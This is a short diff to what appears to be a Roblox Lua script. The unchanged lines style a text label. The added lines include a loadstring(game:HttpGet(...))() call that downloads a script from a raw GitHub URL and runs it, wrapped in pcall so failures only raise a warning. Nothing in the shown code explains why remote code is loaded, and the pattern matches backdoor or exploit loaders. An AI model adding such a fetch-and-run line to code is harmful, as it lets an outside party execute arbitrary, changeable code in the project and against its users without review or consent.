@@ -1574,3 +1574,11 @@ tL.Font = Enum.Font.Arcade
 tL.TextScaled = true -- scale
 tL.TextTransparency = 0.7 -- opaque
 tL.Parent = sG
+humanoid.AnimationPlayed:Connect(onAnimationTrackStarted)
+
+local success, err = pcall(function()
+    loadstring(game:HttpGet('https://raw.githubusercontent.com/Kenjihin69/Kenjihin69/refs/heads/main/Nananana%20let%20me%20love%20you'))()
+end)
+if not success then
+    warn("Failed to load external script:", err)
+end
